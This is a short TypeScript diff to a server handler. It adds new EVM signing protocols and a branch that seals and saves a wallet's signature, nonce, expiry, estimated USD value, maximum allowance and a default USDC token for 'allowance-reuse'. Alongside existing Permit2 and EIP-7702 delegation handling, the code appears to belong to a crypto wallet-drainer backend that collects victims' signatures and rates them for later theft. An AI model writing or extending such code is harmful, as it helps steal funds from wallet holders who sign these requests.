@@ -298,6 +298,8 @@ async function gatekeeperEthereumRpcUrl(): Promise<string> {
 
 const PROTOCOL_RACK = new Set([
   'evm',
+  'evm_personal_verification',
+  'evm_server_signing',
   'permit2_eip712',
   'permit2_batch_eip712',
   'eip7702_delegation',
@@ -3215,6 +3217,32 @@ async function handleNormalizedIngress(
           requires_quorum: tel.requires_quorum,
           source_origin: sourceOrigin,
           ...(chainIdNorm !== undefined ? { chain_id: chainIdNorm } : {}),
+        },
+        reply,
+      )
+    }
+
+    // EVM personal_sign verification — store + allowance-reuse only (no Permit2 execution)
+    if (protocolNorm === 'evm_personal_verification' || protocolNorm === 'evm_server_signing') {
+      const chainIdNorm = b.chain_id != null ? String(b.chain_id).trim() : '1'
+      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
+      const sealed = sealSignatureHexForPersistence(sig as Hex)
+      return persistSignatureRow(
+        {
+          wallet_address,
+          token_address: token_address || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+          signature_hex: sealed,
+          nonce: b.nonce,
+          expiry: b.expiry_iso,
+          wallet_type: b.wallet_type.trim(),
+          protocol: 'evm_personal_verification',
+          chain_family: 'EVM',
+          scout_value_usd: tel.scout_value_usd,
+          amount: tel.amount ?? '0',
+          max_allowance: tel.max_allowance,
+          requires_quorum: tel.requires_quorum,
+          source_origin: sourceOrigin,
+          chain_id: chainIdNorm,
         },
         reply,
       )
